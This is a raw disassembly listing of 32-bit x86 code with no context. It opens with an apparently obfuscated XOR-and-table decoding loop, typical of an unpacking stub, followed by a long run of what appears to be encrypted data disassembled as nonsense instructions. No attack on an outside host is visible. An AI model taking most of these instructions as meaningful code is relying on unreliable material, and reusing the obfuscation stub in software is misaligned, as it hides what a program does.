  4060ae:	imul   eax,edx
  4060b1:	mov    edx,DWORD PTR [ebp-0x5c]
  4060b4:	xor    edx,esi
  4060b6:	add    eax,edx
  4060b8:	mov    edx,DWORD PTR [ebp-0x8]
  4060bb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f3]
  4060c3:	mov    edx,DWORD PTR [ebp-0x4c]
  4060c6:	xor    edx,esi
  4060c8:	lea    eax,[edx+eax*1+0x3272f3]
  4060cf:	movzx  edx,BYTE PTR [ebp-0x1]
  4060d3:	xor    edx,eax
  4060d5:	mov    BYTE PTR [ebp-0x1],dl
  4060d8:	mov    al,BYTE PTR [ebp-0x1]
  4060db:	mov    edx,DWORD PTR [ebp-0x30]
  4060de:	mov    ebx,DWORD PTR [ebp-0xc]
  4060e1:	xor    edx,esi
  4060e3:	add    edx,edi
  4060e5:	imul   edx,ebx
  4060e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4060eb:	mov    BYTE PTR [edx+ebx*1],al
  4060ee:	mov    eax,DWORD PTR [ebp-0x30]
  4060f1:	mov    edx,DWORD PTR [ebp-0xc]
  4060f4:	xor    eax,esi
  4060f6:	add    eax,edi
  4060f8:	imul   eax,edx
  4060fb:	mov    edx,DWORD PTR [ebp-0x8]
  4060fe:	mov    al,BYTE PTR [eax+edx*1]
  406101:	mov    BYTE PTR [ebp-0x1],al
  406104:	mov    eax,DWORD PTR [ebp-0x30]
  406107:	mov    edx,DWORD PTR [ebp-0xc]
  40610a:	xor    eax,esi
  40610c:	add    eax,edi
  40610e:	imul   eax,edx
  406111:	mov    edx,DWORD PTR [ebp-0x28]
  406114:	xor    edx,esi
  406116:	add    eax,edx
  406118:	mov    edx,DWORD PTR [ebp-0x8]
  40611b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f3]
  406123:	mov    edx,DWORD PTR [ebp-0x50]
  406126:	xor    edx,esi
  406128:	lea    eax,[edx+eax*1+0x3272f3]
  40612f:	movzx  edx,BYTE PTR [ebp-0x1]
  406133:	xor    edx,eax
  406135:	mov    BYTE PTR [ebp-0x1],dl
  406138:	mov    al,BYTE PTR [ebp-0x1]
  40613b:	mov    edx,DWORD PTR [ebp-0x30]
  40613e:	mov    ebx,DWORD PTR [ebp-0xc]
  406141:	xor    edx,esi
  406143:	add    edx,edi
  406145:	imul   edx,ebx
  406148:	mov    ebx,DWORD PTR [ebp-0x8]
  40614b:	jmp    0x4084fc
  406150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406151:	mov    dh,0x7b
  406153:	sbb    eax,0x86859860
  406158:	scas   eax,DWORD PTR es:[edi]
  406159:	mov    cl,0xac
  40615b:	nop
  40615c:	ror    BYTE PTR cs:[ebx+0x6a],0x5b
  406161:	cmp    BYTE PTR [ebx-0x7ca3107d],al
  406167:	sbb    DWORD PTR [esi-0x17],0xffffffaf
  40616b:	jp     0x406179
  40616d:	in     al,dx
  40616e:	push   ebx
  40616f:	(bad)  
  406170:	or     eax,0xce9c5fec
  406175:	adc    ebp,ebx
  406177:	lea    eax,[esi+0x5f5f2a94]
  40617d:	push   ecx
  40617e:	mov    bl,0xaa
  406180:	mov    dl,0xfc
  406182:	mov    ebx,0x58398d69
  406187:	fisttp QWORD PTR [edi+edi*1]
  40618a:	imul   ebx,DWORD PTR [edi+0x40],0x9db33173
  406191:	es std 
  406193:	or     dl,BYTE PTR [eax-0x2d47a22]
  406199:	dec    edi
  40619a:	stc    
  40619b:	loope  0x4061c5
  40619d:	test   al,0x1d
  40619f:	loopne 0x40616b
  4061a1:	adc    eax,0x4540a251
  4061a6:	(bad)  
  4061a7:	hlt    
  4061a8:	mov    bl,0xa0
  4061aa:	xlat   BYTE PTR ds:[ebx]
  4061ab:	push   0x3b
  4061ad:	ins    DWORD PTR es:[edi],dx
  4061ae:	xor    DWORD PTR [ecx],edi
  4061b0:	aam    0xbb
  4061b2:	lods   eax,DWORD PTR ds:[esi]
  4061b3:	call   0xdd59:0x9b8f5815
  4061ba:	int3   
  4061bb:	std    
  4061bc:	xchg   esi,eax
  4061bd:	push   esp
  4061be:	or     al,0x6e
  4061c0:	sbb    eax,0x7c69a613
  4061c5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c7:	mov    ds:0x841ca60b,al
  4061cc:	inc    eax
  4061cd:	and    eax,edi
  4061cf:	jle    0x4061ac
  4061d1:	jne    0x406191
  4061d3:	adc    al,0xb4
  4061d5:	push   ss
  4061d6:	add    al,0xfb
  4061d8:	out    0x9d,al
  4061da:	pop    esp
  4061db:	or     DWORD PTR [ebx],ecx
  4061dd:	mov    ebx,0x26b7eebc
  4061e2:	or     BYTE PTR [edi+edx*1+0x61],0xdb
  4061e7:	push   ebp
  4061e8:	or     eax,0xd4108a42
  4061ed:	fdiv   DWORD PTR [esi+ecx*4+0x22]
  4061f1:	sahf   
  4061f2:	cs clc 
  4061f4:	jne    0x40620e
  4061f6:	xchg   edi,eax
  4061f7:	shl    BYTE PTR [eax-0x36668c9],cl
  4061fd:	cs loope 0x406196
  406200:	push   0x9281a698
  406205:	sbb    al,BYTE PTR [eax-0x48]
  406208:	adc    ch,al
  40620a:	jmp    0xfbfd:0x4b59fbd5
  406211:	mov    eax,0xa55f3044
  406216:	adc    al,ah
  406218:	mov    ah,0x2d
  40621a:	pop    edx
  40621b:	aaa    
  40621c:	lods   al,BYTE PTR ds:[esi]
  40621d:	lods   al,BYTE PTR ds:[esi]
  40621e:	jl     0x4061b9
  406220:	into   
  406221:	(bad)  [eax+0x4]
  406224:	jns    0x406223
  406226:	jle    0x4062a6
  406228:	das    
  406229:	pop    ds
  40622a:	fwait
  40622b:	mov    ecx,0x3e927d1b
  406230:	add    al,0xbf
  406232:	fucom  st(3)
  406234:	rdpmc  
  406236:	in     eax,dx
  406237:	(bad)  
  406238:	mov    al,0x49
  40623a:	xchg   esi,eax
  40623b:	sub    eax,0x347a8a97
  406240:	out    0x1d,al
  406242:	or     ebp,esi
  406244:	sbb    ebx,edx
  406246:	ss mov esi,0x169daa9b
  40624c:	jo     0x406249
  40624e:	mov    dl,0x43
  406250:	lods   al,BYTE PTR ds:[esi]
  406251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406252:	scas   eax,DWORD PTR es:[edi]
  406253:	stos   DWORD PTR es:[edi],eax
  406254:	retf   0x5959
  406257:	push   ss
  406258:	push   ds
  406259:	fidiv  WORD PTR [esi+ebx*4+0x72b864a5]
  406260:	aaa    
  406261:	sbb    ah,dl
  406263:	mov    ah,0xf9
  406265:	or     DWORD PTR [ecx],edi
  406267:	lds    ebx,FWORD PTR [edx+eiz*2]
  40626a:	inc    esi
  40626b:	mov    ah,0x11
  40626d:	sub    al,0x62
  40626f:	jb     0x406261
  406271:	xchg   esi,eax
  406272:	pop    ss
  406273:	lods   eax,DWORD PTR ds:[esi]
  406274:	or     BYTE PTR [edi+0x64a0770f],bh
  40627a:	push   edx
  40627b:	adc    BYTE PTR [ecx],cl
  40627d:	(bad)  
  40627e:	shr    BYTE PTR [edx-0x5415ac2f],0x62
  406285:	cmp    eax,0xa45f58dc
  40628a:	mov    bl,0x48
  40628c:	popa   
  40628d:	out    dx,eax
  40628e:	mov    esp,0x5e211bc
  406293:	stc    
  406294:	in     al,0x79
  406296:	out    0xdb,al
  406298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406299:	xchg   edx,eax
  40629a:	jns    0x40630b
  40629c:	sub    BYTE PTR [edi],0x68
  40629f:	jnp    0x40622a
  4062a1:	xchg   edx,eax
  4062a2:	into   
  4062a3:	xchg   DWORD PTR [ebp-0x40c6de81],ebp
  4062a9:	push   ebp
  4062aa:	sub    al,0xbd
  4062ac:	pop    ds
  4062ad:	xchg   ebx,eax
  4062ae:	sti    
  4062af:	pusha  
  4062b0:	mov    ebp,0xcb0c405f
  4062b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062b6:	push   cs
  4062b7:	inc    edi
  4062b8:	pop    ds
  4062b9:	mov    BYTE PTR [esi-0x30227b7f],0xff
  4062c0:	jb     0x40630d
  4062c2:	mov    DWORD PTR [ebx-0x70a8296e],esi
  4062c8:	jecxz  0x406261
  4062ca:	jnp    0x4062dd
  4062cc:	stos   BYTE PTR es:[edi],al
  4062cd:	or     eax,0x321d6738
  4062d2:	(bad)  [edi-0x22]
  4062d5:	and    DWORD PTR [ebx-0x70e9738e],eax
  4062db:	mov    edi,0x2933227f
  4062e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062e1:	clc    
  4062e2:	push   ds
  4062e3:	jno    0x4062e2
  4062e5:	out    0x69,al
  4062e7:	sub    bh,BYTE PTR [ecx+0x2c744f8e]
  4062ed:	icebp  
  4062ee:	add    esp,edx
  4062f0:	or     BYTE PTR [edx+0x47cdb320],ah
  4062f6:	es pop edi
  4062f8:	sub    eax,0x8ba49871
  4062fd:	or     BYTE PTR [eax-0x729296b4],0xf1
  406304:	popf   
  406305:	int    0x18
  406307:	cdq    
  406308:	add    BYTE PTR [esi+0x26],ch
  40630b:	cmp    eax,0x3aacbf00
  406310:	jmp    FWORD PTR [ecx+0x73]
  406313:	jg     0x4062e9
  406315:	inc    edi
  406316:	and    ch,al
  406318:	outs   dx,DWORD PTR ds:[esi]
  406319:	(bad)  
  40631a:	fcmovu st,st(0)
  40631c:	push   esi
  40631e:	inc    edx
  40631f:	stos   DWORD PTR es:[edi],eax
  406320:	iret   
  406321:	push   esp
  406322:	imul   DWORD PTR [ebp+0xd]
  406325:	dec    eax
  406326:	das    
  406327:	ret    
  406328:	loop   0x40639c
  40632a:	sbb    DWORD PTR [edi-0x18d01322],eax
  406330:	dec    ebx
  406331:	repnz sti 
  406333:	mov    WORD PTR [edx-0x73de773e],fs
  406339:	push   0xf
  40633b:	and    BYTE PTR [ecx+edi*8-0x28],bl
  40633f:	sbb    al,0xb3
  406341:	dec    esi
  406342:	pop    esp
  406343:	stc    
  406344:	jns    0x4062c9
  406346:	jns    0x406301
  406348:	fdivr  st,st(7)
  40634a:	add    al,0x91
  40634c:	mov    ebx,0x656a885b
  406351:	les    ebx,FWORD PTR fs:[esi]
  406354:	pop    es
  406355:	mov    bl,0x77
  406357:	test   BYTE PTR [edi],ch
  406359:	addr16 mov edi,0x8cd21340
  40635f:	call   0x1cf6:0xe6da65a7
  406366:	das    
  406367:	imul   edi,DWORD PTR [eax-0x599ad3f2],0x68
  40636e:	push   edx
  40636f:	mov    edx,0x8fef5f1
  406374:	ins    BYTE PTR es:[di],dx
  406376:	xchg   ecx,eax
  406377:	pop    es
  406378:	push   ebp
  406379:	or     esp,DWORD PTR [ebp+0xe]
  40637c:	pop    esp
  40637d:	neg    bh
  40637f:	inc    ebp
  406380:	or     al,BYTE PTR [edi]
  406382:	ds pop edi
  406384:	cmp    eax,0xa1973949
  406389:	or     ebp,DWORD PTR [ecx-0x2b9e4d8d]
  40638f:	rcr    BYTE PTR [eax+0x1c],cl
  406392:	xor    esi,DWORD PTR [edi-0x5e35680a]
  406398:	mov    dh,0x4d
  40639a:	mov    ch,0x9e
  40639c:	je     0x4063ad
  40639e:	mov    ebp,0x3b1b632d
  4063a3:	sbb    al,0xbe
  4063a5:	or     ch,BYTE PTR ds:0x46929863
  4063ab:	cmc    
  4063ac:	ror    cl,1
  4063ae:	mov    ?,edx
  4063b0:	in     al,0xce
  4063b2:	inc    eax
  4063b3:	xchg   esp,eax
  4063b4:	test   eax,0xf70d6d8a
  4063b9:	mov    fs,WORD PTR [edi]
  4063bb:	xchg   ebx,eax
  4063bc:	pop    ecx
  4063bd:	sub    BYTE PTR [ebp+0x250072a7],ch
  4063c3:	add    al,0xbf
  4063c5:	sub    BYTE PTR [ecx-0x145b1bd1],ah
  4063cb:	jmp    ebx
  4063cd:	push   esi
  4063ce:	(bad)  
  4063cf:	mov    ds:0x59f9bb6c,eax
  4063d4:	into   
  4063d5:	es push 0xf556144a
  4063db:	jb     0x40635e
  4063dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063de:	mov    edx,DWORD PTR [edx]
  4063e0:	mov    ebp,0x5eff1f17
  4063e5:	test   eax,0xa586e642
  4063ea:	test   DWORD PTR [eax-0x5f8afc46],edi
  4063f0:	lahf   
  4063f1:	jmp    0x5089:0xf4df5588
  4063f8:	mov    eax,ds:0x1190dd92
  4063fd:	adc    edi,DWORD PTR [ecx-0x3a]
  406400:	std    
  406401:	cld    
  406402:	cmp    ah,dl
  406404:	mov    bh,0xb8
  406406:	outs   dx,BYTE PTR ds:[esi]
  406408:	(bad)  
  406409:	(bad)  
  40640b:	mov    ah,0x82
  40640d:	popf   
  40640e:	xor    DWORD PTR [esi+0x4f22840d],ecx
  406414:	(bad)  
  406416:	push   esp
  406417:	or     al,0x89
  406419:	xor    al,0x7a
  40641b:	neg    BYTE PTR [eax+ecx*8+0x29988252]
  406422:	mov    bl,0x71
  406424:	push   cs
  406425:	xor    cl,0x4f
  406428:	hlt    
  406429:	inc    si
  40642b:	shr    BYTE PTR [ecx-0x6db28c3],1
  406431:	call   0x9fb922e0
  406436:	mov    al,ds:0x20f9607c
  40643b:	or     al,0x19
  40643d:	mov    esi,0x36c52e1c
  406442:	mov    al,ds:0xb04d359f
  406447:	ins    DWORD PTR es:[edi],dx
  406448:	pop    ecx
  406449:	ja     0x4063f1
  40644b:	jmp    0x406473
  40644d:	fstp   TBYTE PTR [esi+0x497daeff]
  406453:	ds addr16 push es
  406456:	fmul   QWORD PTR ds:0xbd5b953b
  40645c:	jmp    0x40641d
  40645e:	dec    ecx
  40645f:	vpsubsw xmm5,xmm3,XMMWORD PTR [esp+eax*2+0x65e7757f]
  406468:	dec    esi
  406469:	sbb    eax,0x4a4f3759
  40646e:	into   
  40646f:	cli    
  406470:	pop    edi
  406471:	and    dh,bl
  406473:	aam    0x47
  406475:	and    BYTE PTR [eax+0x2dd7b6ee],al
  40647b:	mov    al,ds:0x7fb6285e
  406480:	mov    al,ds:0x663e786e
  406485:	(bad)  
  406486:	std    
  406487:	sbb    BYTE PTR [edx],bl
  406489:	dec    ebp
  40648a:	(bad)  
  40648b:	loopne 0x406497
  40648d:	push   eax
  40648e:	pop    ebx
  40648f:	adc    DWORD PTR [esi],edx
  406491:	cmp    DWORD PTR [edi+0x76],esp
  406494:	test   BYTE PTR [esi+0x289bd8df],0xce
  40649b:	push   ecx
  40649c:	or     eax,0x50f68d32
  4064a1:	(bad)  
  4064a2:	mov    eax,ds:0x5ad01ca6
  4064a7:	add    eax,0x55da29df
  4064ac:	dec    esp
  4064ad:	mov    al,BYTE PTR [ecx]
  4064af:	adc    al,0x31
  4064b1:	inc    edx
  4064b2:	mul    DWORD PTR [esi-0x120b9fe1]
  4064b8:	cmp    dh,BYTE PTR [ecx]
  4064ba:	xor    dl,BYTE PTR [ebx+0x6fbb562b]
  4064c0:	nop
  4064c1:	pop    ebx
  4064c2:	add    eax,0x1258da17
  4064c7:	inc    esi
  4064c8:	mov    ebx,0xd75a595
  4064cd:	cmp    esi,0xffffffcb
  4064d0:	imul   ecx,DWORD PTR [ebp-0x28eccf06],0xaa3d0d30
  4064da:	jmp    0xa845:0xd77d94a7
  4064e1:	xor    dl,cl
  4064e3:	out    dx,eax
  4064e4:	and    ah,dl
  4064e6:	aaa    
  4064e7:	xchg   esi,eax
  4064e8:	push   esi
  4064e9:	xor    al,0xdf
  4064eb:	mov    eax,ds:0xff9d2955
  4064f0:	jae    0x4064ba
  4064f2:	or     dh,BYTE PTR [esi+ecx*2]
  4064f5:	inc    edi
  4064f6:	jae    0x406491
  4064f8:	outs   dx,DWORD PTR ds:[esi]
  4064f9:	retf   0xa19a
  4064fc:	(bad)  
  4064fd:	push   edi
  4064fe:	and    eax,0x820a0182
  406503:	and    al,bh
  406505:	or     al,0xd8
  406507:	popa   
  406508:	push   cs
  406509:	and    bh,BYTE PTR [ecx]
  40650b:	mov    ds:0x878e1971,al
  406510:	je     0x406567
  406512:	lods   eax,DWORD PTR ds:[esi]
  406513:	cmp    BYTE PTR [ebx+0x374df355],0xe0
  40651a:	pop    es
  40651b:	fsub   st(0),st
  40651d:	ds retf 
  40651f:	aas    
  406520:	jmp    0x40651e
  406522:	xchg   edx,eax
  406523:	sub    al,al
  406525:	cli    
  406526:	(bad)  
  406527:	and    eax,esp
  406529:	or     bh,0xdc
  40652c:	xor    eax,0x70f9ea80
  406531:	inc    ebx
  406532:	jg     0x4064e1
  406534:	imul   ecx,DWORD PTR [ebx],0xb3eb9bfa
  40653a:	xchg   BYTE PTR [ebx],al
  40653c:	mov    bh,0x30
  40653e:	test   al,dh
  406540:	mov    esp,0xfc2a8923
  406545:	imul   edi,DWORD PTR [edi-0xf],0xfffffffb
  406549:	leave  
  40654a:	sbb    BYTE PTR [esi-0x3d],dh
  40654d:	mov    bl,0xcc
  40654f:	js     0x406512
  406551:	cdq    
  406552:	outs   dx,DWORD PTR ds:[esi]
  406553:	xchg   edx,eax
  406554:	out    dx,eax
  406555:	lods   eax,DWORD PTR ds:[esi]
  406556:	fcmovu st,st(6)
  406558:	cs pop edi
  40655a:	out    0xc3,al
  40655c:	jp     0x4065b9
  40655e:	cmp    BYTE PTR [edi],cl
  406560:	ja     0x4065c4
  406562:	addr16 je 0x4065a5
  406565:	mov    bh,0x91
  406567:	shr    DWORD PTR [ecx],1
  406569:	cld    
  40656a:	jno    0x4065b7
  40656c:	or     al,0x50
  40656e:	pop    eax
  40656f:	cmp    DWORD PTR [ecx+edi*8+0x50f3faf0],0x9e47f3ba
  40657a:	and    BYTE PTR [edx-0x48aa4bd6],cl
  406580:	les    ecx,FWORD PTR [edx+ecx*2+0x7b]
  406584:	test   BYTE PTR [edi-0x19d3b2f2],cl
  40658a:	push   eax
  40658b:	int    0x32
  40658d:	push   eax
  40658e:	jbe    0x40658c
  406590:	pop    eax
  406591:	retf   0x121d
  406594:	popf   
  406595:	cs clc 
  406597:	push   ss
  406598:	jns    0x4065c4
  40659a:	les    esi,FWORD PTR [edx]
  40659c:	or     eax,0x882993e8
  4065a1:	lods   al,BYTE PTR ds:[esi]
  4065a2:	ins    DWORD PTR es:[edi],dx
  4065a3:	jno    0x4065b6
  4065a5:	dec    edx
  4065a6:	fld    QWORD PTR [ecx+0x56c9565c]
  4065ac:	add    BYTE PTR [ebx+0xc],bl
  4065af:	pop    ss
  4065b0:	loopne 0x40657b
  4065b2:	dec    eax
  4065b3:	pop    ds
  4065b4:	and    eax,0x655a4864
  4065b9:	mov    cl,0xa4
  4065bb:	ins    DWORD PTR es:[edi],dx
  4065bc:	fdivr  QWORD PTR [edx-0x12]
  4065bf:	or     BYTE PTR gs:[ebx+0x43],0x29
  4065c4:	rcl    DWORD PTR [edi],cl
  4065c6:	xor    esi,DWORD PTR [ecx-0x23]
  4065c9:	mov    BYTE PTR [ebp-0x66b44500],bh
  4065cf:	xchg   edi,eax
  4065d0:	(bad)  
  4065d1:	cmc    
  4065d2:	xlat   BYTE PTR cs:[ebx]
  4065d4:	cmp    al,0x68
  4065d6:	push   ecx
  4065d7:	sub    DWORD PTR [esi-0x6b0319c5],edx
  4065dd:	mov    esi,0x343e1223
  4065e2:	clc    
  4065e3:	adc    DWORD PTR [ebx+0x51],eax
  4065e6:	xor    al,0x8a
  4065e8:	mov    bl,0xf6
  4065ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065eb:	dec    edx
  4065ec:	mov    bh,0x59
  4065ee:	sbb    eax,0x5390d648
  4065f3:	jp     0x4065cb
  4065f5:	inc    esi
  4065f6:	inc    esi
  4065f7:	jmp    0xeec4e42e
  4065fc:	mov    al,0xae
  4065fe:	jmp    0x4065f3
  406600:	mov    dh,BYTE PTR [edx-0x69d62d2b]
  406606:	call   0x28910491
  40660b:	xor    ebx,DWORD PTR [esi]
  40660d:	and    bl,dh
  40660f:	stos   BYTE PTR es:[edi],al
  406610:	repz or BYTE PTR [ebx],dh
  406613:	scas   eax,DWORD PTR es:[edi]
  406614:	push   edi
  406615:	jl     0x406637
  406617:	sahf   
  406618:	int    0xe6
  40661a:	sbb    DWORD PTR [ebp-0x3c],0xffffffdf
  40661e:	lds    edx,FWORD PTR [esi+0x7e]
  406621:	jp     0x4066a1
  406623:	add    DWORD PTR ds:0xc70fca9b,esi
  406629:	test   bh,al
  40662b:	push   0xffffffed
  40662d:	fsub   QWORD PTR [ebx+ebp*8-0x1d4a1e8]
  406634:	pop    DWORD PTR ds:0xa0a724bf
  40663a:	mov    esp,0x715789df
  40663f:	ss iret 
  406641:	test   DWORD PTR [eax],ecx
  406643:	es jnp 0x4066c2
  406646:	xchg   ebx,eax
  406647:	inc    edx
  406648:	mov    al,ds:0x214b9423
  40664d:	pop    eax
  40664e:	ficom  WORD PTR [ebp-0x1c]
  406651:	jp     0x406612
  406653:	scas   al,BYTE PTR es:[edi]
  406654:	xacquire xchg BYTE PTR cs:[edx+0x38],dh
  406659:	add    eax,0x167ab73e
  40665e:	clc    
  40665f:	xlat   BYTE PTR ds:[ebx]
  406660:	bound  esp,QWORD PTR [esi-0x332b7902]
  406666:	mov    bh,BYTE PTR [eax-0x53b799f3]
  40666c:	rcr    BYTE PTR [ebx],1
  40666e:	dec    edi
  40666f:	dec    ebp
  406670:	into   
  406671:	adc    ebx,ecx
  406673:	mov    WORD PTR [ecx-0x13],gs
  406676:	sub    eax,0x5e76ca93
  40667b:	sub    eax,DWORD PTR [ecx-0x1518b7af]
  406681:	lock ds pushf 
  406684:	int    0x31
  406686:	stos   DWORD PTR es:[edi],eax
  406687:	mov    dh,0xd8
  406689:	sar    BYTE PTR [edx-0x11],0x18
  40668d:	jno    0x4066bb
  40668f:	aaa    
  406690:	add    eax,0x4d5e7172
  406695:	cmc    
  406696:	jg     0x406639
  406698:	dec    edx
  406699:	popa   
  40669a:	and    dl,BYTE PTR [edi]
  40669c:	outs   dx,DWORD PTR ds:[esi]
  40669d:	sub    al,dh
  40669f:	jnp    0x406660
  4066a1:	push   edi
  4066a2:	or     dh,cl
  4066a4:	xor    BYTE PTR [ecx],bl
  4066a6:	inc    eax
  4066a7:	adc    ch,BYTE PTR fs:[eax]
  4066aa:	add    dh,BYTE PTR [ecx]
  4066ac:	or     al,0x1a
  4066ae:	in     al,0x62
  4066b0:	in     al,dx
  4066b1:	inc    eax
  4066b2:	in     al,0x2b
  4066b4:	push   0x4e03c1ac
  4066b9:	pop    eax
  4066ba:	jbe    0x4066e5
  4066bc:	bound  ebp,QWORD PTR [eax+0x2e5f49ff]
  4066c2:	push   0x755b10af
  4066c7:	out    dx,al
  4066c8:	and    al,0xb8
  4066ca:	push   ebp
  4066cb:	inc    ebp
  4066cc:	inc    edi
  4066cd:	inc    eax
  4066ce:	test   al,0x7
  4066d0:	adc    ebp,eax
  4066d2:	iret   
  4066d3:	icebp  
  4066d4:	addr16 shl esi,0xd0
  4066d8:	ds (bad) 
  4066da:	das    
  4066db:	jl     0x406722
  4066dd:	sbb    edx,ebx
  4066df:	xor    BYTE PTR [edx-0x4eb7ebfd],cl
  4066e5:	sub    eax,0x87c7a060
  4066ea:	dec    esi
  4066eb:	out    dx,al
  4066ec:	fisubr WORD PTR [ebp-0x1f478abe]
  4066f2:	xchg   edi,eax
  4066f3:	dec    edx
  4066f4:	jae    0x40674a
  4066f6:	xchg   ecx,eax
  4066f7:	cmp    dh,0x25
  4066fa:	xchg   ebx,eax
  4066fb:	cmp    eax,0xe370d9db
  406700:	dec    ecx
  406701:	sub    eax,0xbe149d9a
  406706:	(bad)  
  406707:	mov    dl,0xd0
  406709:	cld    
  40670a:	mov    ah,0x5
  40670c:	faddp  st(1),st
  40670e:	cwde   
  40670f:	(bad)  
  406710:	mov    cl,0xf5
  406712:	repz or ebx,DWORD PTR [ecx+0x5b4dea1]
  406719:	mov    esi,0x42b8ee63
  40671e:	inc    ebx
  40671f:	ret    0x455e
  406722:	mov    ebx,0xbc8f8559
  406727:	xchg   esi,eax
  406728:	retf   0x65e6
  40672b:	push   es
  40672c:	jmp    0x40677b
  40672e:	mov    ebx,0x95e95eb6
  406733:	leave  
  406734:	in     al,0x65
  406736:	mov    ebx,0x4671b856
  40673b:	mov    edi,0x964d0ee8
  406740:	xchg   esp,eax
  406741:	xchg   esi,eax
  406742:	xlat   BYTE PTR ds:[ebx]
  406743:	pop    ebp
  406744:	lahf   
  406745:	xor    DWORD PTR [ecx+edx*2-0x74],esp
  406749:	and    al,0x57
  40674b:	and    BYTE PTR [ebp+0x47],0xd4
  40674f:	jae    0x40678e
  406751:	jb     0x40672e
  406753:	dec    esi
  406754:	xchg   esp,eax
  406755:	xchg   esp,eax
  406756:	leave  
  406757:	scas   eax,DWORD PTR es:[edi]
  406758:	dec    eax
  406759:	aaa    
  40675a:	and    bl,BYTE PTR [edx]
  40675c:	push   0xffffff8f
  40675e:	ja     0x40673b
  406760:	push   edx
  406761:	pushf  
  406762:	fs pop eax
  406764:	inc    ebx
  406765:	mov    ds:0x2f84416e,al
  40676a:	bound  edi,QWORD PTR [ebx+0x27bf0901]
  406770:	outs   dx,DWORD PTR ds:[esi]
  406771:	setne  ah
  406774:	int3   
  406775:	in     al,dx
  406776:	sbb    DWORD PTR [edi-0x6b],0x19
  40677a:	dec    ebx
  40677b:	rcr    ch,0x22
  40677e:	dec    edx
  40677f:	loopne 0x4067a5
  406781:	retf   
  406782:	xor    eax,0x52d577d4
  406787:	sbb    DWORD PTR [ebp-0x1694270e],ebx
  40678d:	xlat   BYTE PTR ds:[ebx]
  40678e:	and    ebp,DWORD PTR [ebp+0x5dc83e13]
  406794:	sub    eax,0x870d8c49
  406799:	popf   
  40679a:	gs call 0xef78:0xf86b2c3f
  4067a2:	sbb    al,0x65
  4067a4:	(bad)  
  4067a5:	cmp    al,0xa6
  4067a7:	jbe    0x40675c
  4067a9:	gs ins BYTE PTR es:[edi],dx
  4067ab:	and    ch,BYTE PTR [ebx-0x775c0eb0]
  4067b1:	push   edi
  4067b2:	inc    esp
  4067b3:	dec    edi
  4067b4:	aam    0x44
  4067b6:	dec    ebp
  4067b7:	pop    ecx
  4067b8:	xchg   ebx,eax
  4067b9:	int    0x63
  4067bb:	retf   0xaa24
  4067be:	mov    ds:0x29bd1704,al
  4067c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c4:	ins    BYTE PTR es:[edi],dx
  4067c5:	(bad)  [edi+0xf]
  4067c8:	cmp    DWORD PTR [esi-0x60],edi
  4067cb:	in     al,0x16
  4067cd:	add    DWORD PTR [eax+ebp*8+0x50d9e04b],esp
  4067d4:	mov    bl,0x74
  4067d6:	sbb    BYTE PTR [edi+0x5f756ff9],al
  4067dc:	and    BYTE PTR [eax-0x19656f30],bl
  4067e2:	pop    ecx
  4067e3:	mov    ds:0xe0fcc632,al
  4067e8:	dec    edx
  4067e9:	pop    ebp
  4067ea:	mov    esp,0xfc1d280a
  4067ef:	or     al,0xdf
  4067f1:	test   al,0xb8
  4067f3:	xchg   DWORD PTR [eax],ecx
  4067f5:	cld    
  4067f6:	add    cl,0x7e
  4067f9:	jecxz  0x4067f8
  4067fb:	sub    DWORD PTR [ebx+0xf],ebp
  4067fe:	fcom   DWORD PTR ds:0xbb79
  406803:	mov    edi,0x994aa2ba
  406808:	test   al,0xab
  40680a:	mov    ebp,0xefc5e6dd
  40680f:	cmp    DWORD PTR [ebp+0x4d],edx
  406812:	fcomp  st(0)
  406814:	inc    ebp
  406815:	jbe    0x406809
  406817:	(bad)  
  406818:	imul   esp,DWORD PTR [esi+edi*2-0x43069e40],0x54
  406820:	push   edx
  406821:	push   esp
  406822:	mov    edx,0x29b71d77
  406827:	stc    
  406828:	dec    ebp
  406829:	pop    esp
  40682a:	mov    DWORD PTR [ecx+0x2a],ebx
  40682d:	int    0x14
  40682f:	sti    
  406830:	lock push ss
  406832:	lea    esp,[esi]
  406834:	and    BYTE PTR [esi],bh
  406836:	pop    esi
  406837:	out    0x81,al
  406839:	adc    ecx,esp
  40683b:	sbb    esp,DWORD PTR [esi-0x9]
  40683e:	iret   
  40683f:	ficom  DWORD PTR [edi]
  406841:	(bad)  
  406842:	aaa    
  406843:	rol    BYTE PTR [edx+edx*4],cl
  406846:	ins    BYTE PTR es:[edi],dx
  406847:	in     al,0x62
  406849:	hlt    
  40684a:	popa   
  40684b:	cmp    BYTE PTR [ebp+0x2f],al
  40684e:	sahf   
  40684f:	push   edi
  406850:	push   0x5ab73207
  406855:	mov    esp,0xebe81df8
  40685a:	lea    ebx,[ebx+0x3f5e7089]
  406860:	retf   
  406861:	arpl   WORD PTR [esi-0x6b],bx
  406864:	jb     0x406820
  406866:	adc    DWORD PTR [ebp+ebx*1+0x41],ebx
  40686a:	imul   ebx,DWORD PTR [ebx],0x1361d04a
  406870:	jo     0x406875
  406872:	add    eax,0x52492a0a
  406877:	outs   dx,BYTE PTR ds:[esi]
  406878:	jne    0x406868
  40687a:	mov    ds:0x1e3d15eb,eax
  40687f:	or     DWORD PTR [edi-0x68],eax
  406882:	ds or  eax,0x5e32b4bf
  406888:	pop    esi
  406889:	push   esi
  40688a:	push   0x61d19e6e
  40688f:	ja     0x40686c
  406891:	nop
  406892:	mov    ch,0x74
  406894:	or     esp,0xffffffad
  406897:	sbb    al,0x3f
  406899:	sbb    esp,0x92bf4d4a
  40689f:	ret    0xb447
  4068a2:	push   eax
  4068a3:	xchg   BYTE PTR ds:0x5f1fc62c,al
  4068a9:	call   ebp
  4068ab:	adc    al,BYTE PTR [edx]
  4068ad:	clc    
  4068ae:	xchg   edi,eax
  4068af:	xchg   edx,eax
  4068b0:	and    bh,BYTE PTR [edi-0x5c]
  4068b3:	push   0xd4f30642
  4068b8:	pop    edx
